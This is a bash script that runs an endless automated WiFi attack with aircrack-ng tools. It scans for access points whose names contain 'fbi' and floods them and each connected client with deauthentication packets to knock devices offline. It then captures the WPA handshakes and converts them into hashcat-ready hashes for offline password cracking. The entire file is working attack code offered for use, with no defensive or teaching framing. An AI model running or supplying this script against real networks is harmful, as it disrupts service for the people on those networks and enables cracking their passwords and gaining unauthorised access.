#!/bin/bash
NC='\033[0m'       # Text Reset

# Regular Colors
GREEN='\033[0;32m'        # Green
YELLOW='\033[0;33m'       # Yellow
WHITE='\033[0;37m'        # White
RED='\033[0;31m'          # Red

# Enable recursive globbing for cleaning
shopt -s globstar

# Configuration
# INTERFACE_PRE="wlx289401b9b39f"
INTERFACE_PRE="wlx2a9401b9b39f"
INTERFACE="wlan0mon"
TARGET_STRING="fbi"
OUTPUT_DIR="./captures"
SCAN_TIME="10s"
MON_TIME="15s"
mkdir -p "$OUTPUT_DIR/scans"
mkdir -p "$OUTPUT_DIR/hashes"

echo -e "${GREEN}Starting target cycle for: $TARGET_STRING${NC}"

# 1. Prepare Interface
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE_PRE
sudo systemctl start NetworkManager
sudo nmcli device set wlan1mon managed no
sudo airmon-ng start $INTERFACE_PRE
# Main loop
while true; do
    # 2. Initial Scan to find channels
    echo -e "${GREEN}Scanning for '$TARGET_STRING' targets ($SCAN_TIME)...${NC}"
    # 1. Perform a quick 15s scan to find current channels for "wombat" targets
    sudo timeout $SCAN_TIME airodump-ng  -w "$OUTPUT_DIR/scans/scan"  "$INTERFACE"  > /dev/null 2>&1
    
    # 2. Parse the latest CSV for BSSID and Channel
    LATEST_CSV=$(ls -t "$OUTPUT_DIR/scans/"*scan*[0-9].csv | head -n 1)
    echo "Using targets from $LATEST_CSV"
    mapfile -t TARGET_LIST < <(sed '/Station/,$d' "$LATEST_CSV" | grep "$TARGET_STRING")
    echo "${#TARGET_LIST[@]} targets found.  Target list:"
    echo -en $YELLOW
    for target in "${TARGET_LIST[@]}"; do
        echo $target | awk -F, '{printf "    %s\n" , $(NF-1)} target' 
    done
    echo -en $NC
    echo -e "${GREEN}Scan complete.  Attacking targets...${NC}"
    echo -en $YELLOW
    for target in "${TARGET_LIST[@]}"; do
        
        ESSID=$(echo $target | awk -F, '{print $(NF-1)} target' | tr -d ' ')
        BSSID=$(echo $target | cut -d',' -f1 | tr -d ' ')
        CH=$(echo $target | cut -d',' -f4 | tr -d ' ')
        SESSION_CAP="$OUTPUT_DIR/$ESSID"

        echo -e "Current Target: $ESSID with BSSID $BSSID on channel $CH"

        sudo timeout 10s airodump-ng --channel "$CH" --bssid "$BSSID" -w "$OUTPUT_DIR/scans/targeted"  "$INTERFACE"  > /dev/null 2>&1 &
        MONITOR_PID=$!
        sleep 5s
        sudo aireplay-ng -0 10 -a "$BSSID" -p 0841 "$INTERFACE"
        TARGETED_CSV=$(ls -t "$OUTPUT_DIR/scans/"*targeted*[0-9].csv | head -n 1)
        wait $MONITOR_PID
        
        # Start airodump-ng for 60 seconds
        sudo timeout $MON_TIME airodump-ng --bssid "$BSSID"  -w "$SESSION_CAP" "$INTERFACE" > /dev/null 2>&1 < /dev/null &
        MONITOR_PID=$!
        sleep 5s # Let it settle
        STATION_LIST=$(sed -n '/Station/,$p' "$TARGETED_CSV" | grep "$BSSID" | cut -d',' -f1 | tr -d ' ')

        echo "Found $(echo "$STATION_LIST" | wc -w) clients for $BSSID. Starting directed deauths..."

        # 2. Loop through each client and send a directed "poke"
        for client in $STATION_LIST; do
            echo "  - Poking Client: $client"
            # Send 5 directed packets specifically to this device
            sudo aireplay-ng -0 5 -a "$BSSID" -c "$client" "$INTERFACE" > /dev/null 2>&1 &
        done
        sudo aireplay-ng -D -0 3 -a "$BSSID" "$INTERFACE"  > /dev/null 2>&1
        wait $MONITOR_PID

        # 3. THE VALIDATION CHECK
        # Use hcxpcapngtool to see if a crackable hash was actually caught
        # If it writes a file, we have a winner.
        LATEST_CAP=$(ls -t "$SESSION_CAP"*.cap | head -n 1)
        TEST_HASH="$OUTPUT_DIR/hashes/${ESSID}.hc22000"
        hcxpcapngtool -o "$TEST_HASH" "$LATEST_CAP" > /dev/null 2>&1

        if [ -s "$TEST_HASH" ]; then
            echo -e " ${RED} SUCCESS: Valid handshake!${YELLOW}"
        else
            echo -e "${WHITE} No handshake${YELLOW}"
        fi
    done
    echo -en $GREEN 
    echo "Finished one full sweep. Restarting scan..."
    echo -en $NC
    sleep 2
done

